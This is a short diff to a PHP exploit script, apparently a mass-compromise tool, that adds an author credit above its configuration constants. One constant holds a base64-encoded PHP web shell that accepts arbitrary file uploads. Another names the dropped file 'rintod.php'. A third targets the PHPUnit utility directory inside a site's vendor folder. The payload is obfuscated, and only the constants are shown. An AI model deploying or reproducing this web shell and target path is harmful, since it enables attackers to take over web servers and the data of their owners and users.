@@ -1,4 +1,5 @@
 <?php
+// Created By Rintod as Con7ext
 define("SHELLCODE", "PD9waHAgDQppZihpc3NldCgkX0ZJTEVTWydyaW50b2QnXVsnbmFtZSddKSl7DQogICRuYW1lID0gJF9GSUxFU1sncmludG9kJ11bJ25hbWUnXTsNCiAgJG50b2QgPSAkX0ZJTEVTWydyaW50b2QnXVsndG1wX25hbWUnXTsNCiAgQG1vdmVfdXBsb2FkZWRfZmlsZSgkbnRvZCwgJG5hbWUpOw0KICBlY2hvICRuYW1lOw0KfWVsc2V7DQogIGVjaG8gIjxmb3JtIG1ldGhvZD1wb3N0IGVuY3R5cGU9bXVsdGlwYXJ0L2Zvcm0tZGF0YT48aW5wdXQgdHlwZT1maWxlIG5hbWU9cmludG9kPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT1VcGxvYWQ+IjsNCn0gDQo/Pg==");
 define("SHELL", "rintod.php");
 define("PAYLOAD", "/vendor/phpunit/phpunit/src/Util/PHP/");
